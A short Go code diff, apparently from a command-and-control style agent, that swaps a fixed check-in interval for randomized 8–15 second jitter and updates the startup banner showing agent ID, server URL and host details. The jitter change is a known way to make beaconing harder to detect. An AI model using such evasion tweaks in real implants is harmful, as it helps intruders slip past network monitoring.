@@ -9,9 +9,10 @@ import (
 )
 
 var (
-	ServerURL       = "http://localhost:5000"
-	CheckInInterval = 10 * time.Second
-	AgentID         string
+	ServerURL string = "http://localhost:5000"
+	JitterMin        = 8 * time.Second
+	JitterMax        = 15 * time.Second
+	AgentID   string
 )
 
 func generateUUID() string {
@@ -30,7 +31,7 @@ func InitConfig() {
 	fmt.Println("═══════════════════════════════════════")
 	fmt.Printf("  Agent ID  : %s\n", AgentID)
 	fmt.Printf("  Server    : %s\n", ServerURL)
-	fmt.Printf("  Interval  : %s\n", CheckInInterval)
+	fmt.Printf("  Jitter    : %s – %s\n", JitterMin, JitterMax)
 	fmt.Printf("  OS/Arch   : %s/%s\n", runtime.GOOS, runtime.GOARCH)
 
 	hostname, err := os.Hostname()
